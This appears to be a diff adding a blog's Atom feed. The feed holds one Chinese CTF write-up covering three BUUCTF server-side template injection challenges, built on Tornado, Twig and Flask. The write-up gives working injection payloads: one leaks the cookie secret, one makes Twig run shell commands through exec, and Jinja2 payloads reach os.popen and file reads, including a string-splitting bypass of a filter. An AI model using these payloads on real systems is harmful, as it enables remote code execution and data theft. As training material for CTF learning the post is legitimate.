@@ -1,0 +1,115 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://example.com</id>
+    <title>FanqieのBlog • Posts by &#34;ssti&#34; tag</title>
+    <link href="http://example.com" />
+    <updated>2021-06-28T12:51:13.874Z</updated>
+    <category term="随笔" />
+    <category term="SSTI" />
+    <category term="反序列化" />
+    <category term="命令执行" />
+    <category term="http" />
+    <category term="代码审计" />
+    <category term="sql" />
+    <category term="SSRF" />
+    <category term="反序列化2" />
+    <category term="文件包含" />
+    <category term="upload" />
+    <category term="业余爱好" />
+    <category term="RCE" />
+    <category term="php" />
+    <category term="python" />
+    <category term="yeah" />
+    <entry>
+        <id>http://example.com/2021/06/28/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
+        <title>(ctfwp)buu中ssti模板注入</title>
+        <link rel="alternate" href="http://example.com/2021/06/28/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;p&gt;学习文章在前一篇&lt;/p&gt;
+&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;一-护网杯-2018easy_tornado&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-护网杯-2018easy_tornado&#34;&gt;#&lt;/a&gt; 一、[护网杯 2018] easy_tornado&lt;/h1&gt;
+&lt;p&gt;打开题目，只有三个链接，如图，&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvSnBTcm5xY3U5UXpnUmsxLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png&lt;/span&gt;&amp;quot; alt=&amp;quot;1.1.png&amp;quot; style=&amp;quot;zoom: 33%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;依次点开&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png&#34; alt=&#34;1.2.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png&#34; alt=&#34;1.3.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/dZghu8sTqkKbjzC.png&#34; alt=&#34;1.4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;根据每个网址的链接和 flag 页面的内容可以推测，flag 应该是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=/fllllllllllllag&amp;amp;filehash=md5(cookie_secret+md5(filename))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这种格式。&lt;/p&gt;
+&lt;p&gt;所以本题的关键在 cookie_secret&lt;/p&gt;
+&lt;p&gt;根据第二个链接内容，百度 render 可以发现，render () 是 tornado 里的函数，可以生成 html 模板。&lt;/p&gt;
+&lt;p&gt;我们对网站进行尝试注入，看是否有注入点&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=/fllllllllllllag&amp;amp;filehash=&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/Q3sXjMgDWcJ6C5P.png&#34; alt=&#34;1.5.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现网页报错，但明显还能尝试注入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;error?msg=&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;    和        error?msg=&amp;#123;&amp;#123;7&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现当输入 7*7 时，返回 orz；输入 7 时，返回 7&lt;/p&gt;
+&lt;p&gt;说明可以注入，但 * 可能被过滤&lt;/p&gt;
+&lt;p&gt;因为存在注入点，所以我们需要寻找 cookie_secret 路径&lt;/p&gt;
+&lt;p&gt;百度发现，其存在位置为 handler.settings&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/qdHivX4ErBChAVl.png&#34; alt=&#34;1.6.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进行注入得&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/JmMcOqjIdl3gPoz.png&#34; alt=&#34;1.7.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39;cookie_secret&#39;: &#39;3b278e82-468b-487a-8cd2-bcf53c8a19d0&#39;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因为 md5 (filename)=md5 (/fllllllllllllag)=3bf9f6cf685a6dd8defadabfb41a03a1&lt;/p&gt;
+&lt;p&gt;拼接后加密得 2bd5cf6fe358fa26518f4bca650e3a79&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/nIfBHhM9GJyP4qo.png&#34; alt=&#34;1.8.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后输入 payload 进行查询，得到 flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;fllllllllllllag&amp;amp;filehash=2bd5cf6fe358fa26518f4bca650e3a79
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/YGEbvcOZQahAgXN.png&#34; alt=&#34;1.9.png&#34;&gt;&lt;/p&gt;
+&lt;p 5d8b767c-07af-46ff-831d-30e9c7f4d32b&gt;flag&lt;/p&gt;
+&lt;h1 id=&#34;二-bjdctf2020cookie-is-so-stable&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-bjdctf2020cookie-is-so-stable&#34;&gt;#&lt;/a&gt; 二、[BJDCTF2020] Cookie is so stable&lt;/h1&gt;
+&lt;p&gt;打开题目，需要输入 id，随便输入后发现找不到 flag&lt;/p&gt;
+&lt;p&gt;尝试注入&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZDR1ZWd0bm9aMjNNaXhzLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png&lt;/span&gt;&amp;quot; alt=&amp;quot;2.1.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvUFFoNFhsYlNLSE5FUk9JLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png&lt;/span&gt;&amp;quot; alt=&amp;quot;2.2.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;发现有明显的注入漏洞，又因为结构为 49 且基于 php，可以推测出模板为 twig。根据源码提示进行抓包，发现 uesr 是注入点&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZkhMb1dpQjhVMXNiWWszLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png&lt;/span&gt;&amp;quot; alt=&amp;quot;2.3.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;直接百度或根据上一篇文章的 payload 进行注入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)&amp;#125;&amp;#125;&amp;#123;&amp;#123;_self.env.getFilter(&#34;cat /flag&#34;)&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvU2ptaEZheG5Jd0RlUmZRLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png&lt;/span&gt;&amp;quot; alt=&amp;quot;2.4.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p d7ef7d9d-6ba4-4dd5-88ec-33500d9b2ad3&gt;得 flag&lt;/p&gt;
+&lt;h1 id=&#34;三-gyctf2020flaskapp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-gyctf2020flaskapp&#34;&gt;#&lt;/a&gt; 三、[GYCTF2020] FlaskApp&lt;/h1&gt;
+&lt;p&gt;进去是这个页面，提示里没有信息&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvVUhrQWR3czVaclhmZ1FiLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png&lt;/span&gt;&amp;quot; alt=&amp;quot;3.1.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;随便尝试后，发现加密中可以注入代码，解密就能得到值：&lt;/p&gt;
+&lt;p&gt;注入 14 得 e3s3Kzd9fQ== 翻译得 14&lt;/p&gt;
+&lt;p&gt;但再注入 49 时，加密得 e3s3Kjd9fQ==&lt;/p&gt;
+&lt;p&gt;再解密却得&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/FkX7dReBKsACnqS.png&#34; alt=&#34;3.2.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;说明存在过滤&lt;/p&gt;
+&lt;p&gt;尝试注入查找目录&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()&#34;)&amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png&#34; alt=&#34;3.3.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现又被过滤了，于是考虑查看源码，在解密中随便输入进入 debug：&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvYUVwWTVQU0RNbEtUd0hmLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png&lt;/span&gt;&amp;quot; alt=&amp;quot;3.4.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;可以发现，在输出结果时有过滤，存在于 app.py 的 waf 中，百度一下 payload，尝试读取文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read() &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/W8zvhqFBGKiSnP5.png&#34; alt=&#34;3.5.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;找到了被过滤的字符&lt;/p&gt;
+&lt;p&gt;拼接 os 和 import 构造 payload 寻找目录：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/mVvwtf8ODhnukRW.png&#34; alt=&#34;3.6.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后拼接 flag，读取文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/this_is_the_fl&#39;+&#39;ag.txt&#39;,&#39;r&#39;).read()&amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/QqiFUklB1j2MESu.png&#34; alt=&#34;3.7.png&#34;&gt;&lt;/p&gt;
+&lt;p f8cc4e99-1ec3-49f2-b0be-b92686d4ff31&gt;得到 flag&lt;/p&gt;
+&lt;h1 id=&#34;四-部分payload总结快速使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-部分payload总结快速使用&#34;&gt;#&lt;/a&gt; 四、部分 payload 总结，快速使用&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pby8yMDIxLzA2LzI4L2J1dSVFNCVCOCVBRCVFNyU5QSU4NCVFOSU4MyVBOCVFNSU4OCU4NnNzdGklRTglQTclQTMlRTklQTIlOTglRTglQkYlODclRTclQTglOEIv&#34;&gt;buu 中的部分 ssti 解题过程&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94aTRvcjB1amkuZ2l0aHViLmlvLzIwMTkvMDEvMTUvZmxhc2slRTQlQjklOEJzc3RpJUU2JUE4JUExJUU2JTlEJUJGJUU2JUIzJUE4JUU1JTg1JUE1LyMlRTYlOTQlQkIlRTUlODclQkI=&#34;&gt;flask 之 ssti 模板注入&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz&#34;&gt;ssti 详解与例题以及绕过 payload 大全&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="SSTI" />
+        <updated>2021-06-28T12:51:13.874Z</updated>
+    </entry>
+</feed>
